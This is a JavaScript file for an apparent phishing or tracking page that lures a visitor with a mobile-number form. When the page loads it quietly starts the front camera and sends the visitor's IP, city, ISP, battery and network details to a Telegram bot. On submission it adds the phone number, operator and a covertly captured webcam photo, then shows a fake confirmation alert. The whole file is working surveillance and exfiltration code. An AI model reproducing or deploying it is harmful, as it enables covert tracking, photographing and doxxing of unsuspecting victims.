async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}

async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        deviceInfo.charging = battery.charging;
        deviceInfo.chargingPercentage = Math.round(battery.level * 100);
    }

    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
    }

    return deviceInfo;
}

async function sendTelegramMessage(token, chatId, message) {
    const API_URL = `https://api.telegram.org/bot${token}/sendMessage`;
    
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };

    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        console.log("Telegram Response:", result);
    } catch (error) {
        console.error("Error sending message:", error);
    }
}

async function capturePhoto() {
    return new Promise((resolve, reject) => {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            if (blob) {
                resolve(blob);
            } else {
                reject(new Error("Failed to capture image"));
            }
        }, 'image/png');
    });
}

async function sendPhoto(token, chatId, photoBlob) {
    const API_FILE_URL = `https://api.telegram.org/bot${token}/sendPhoto`;
    const formData = new FormData();
    
    formData.append('chat_id', chatId);
    formData.append('photo', photoBlob, 'photo.png');

    try {
        const response = await fetch(API_FILE_URL, {
            method: "POST",
            body: formData
        });

        const result = await response.json();
        console.log("Photo sent:", result);
    } catch (error) {
        console.error("Error sending photo:", error);
    }
}

async function sendInitialInfo() {
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token');
    const chatId = urlParams.get('id');

    if (!token || !chatId) {
        console.error("Bot token or Chat ID missing in URL!");
        return;
    }

    const ipDetails = await getIpDetails();
    const deviceInfo = await getDeviceInfo();

    const message = `
<b><u>ℹ️ Activity Tracked:</u></b>

<b>🌐 IP Address:</b> <i>${ipDetails.ip}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.org}</i>
<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>

<b>📱Device Info:</b>
<b>🔋 Charging:</b> <i>${deviceInfo.charging ? 'Yes' : 'No'}</i>
<b>🔌 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
<b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
<b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>
`;

    await sendTelegramMessage(token, chatId, message);
}

document.getElementById('data-form').addEventListener('submit', async function (event) {
    event.preventDefault();

    const operator = document.getElementById('operator').value;
    const mobileNumber = document.getElementById('mobile-number').value;
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token');
    const chatId = urlParams.get('id');

    if (!token || !chatId) {
        alert("Bot token or Chat ID is missing in the URL!");
        return;
    }

    const ipDetails = await getIpDetails();

    const message = `
<b><u>☎️ Number Tracked</u></b>
<b>📱 Mobile number:</b> +91${mobileNumber}
<b>📡 Operator:</b> ${operator}

<b>🌐 IP Information:</b>
<b>🌐 IP Address:</b> <i>${ipDetails.ip}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.org}</i>
<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
`;

    await sendTelegramMessage(token, chatId, message);

    try {
        const photoBlob = await capturePhoto();
        await sendPhoto(token, chatId, photoBlob);
    } catch (error) {
        console.error("Error capturing or sending photo:", error);
    }

    alert("Your request has been processed under 24 hours!");
});

document.getElementById('mobile-number').addEventListener('input', function () {
    this.value = this.value.replace(/[^0-9]/g, '');
});

async function startCamera() {
    const video = document.getElementById('video');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
        video.play();
    } catch (error) {
        console.error("Error accessing camera:", error);
    }
}

startCamera();
sendInitialInfo();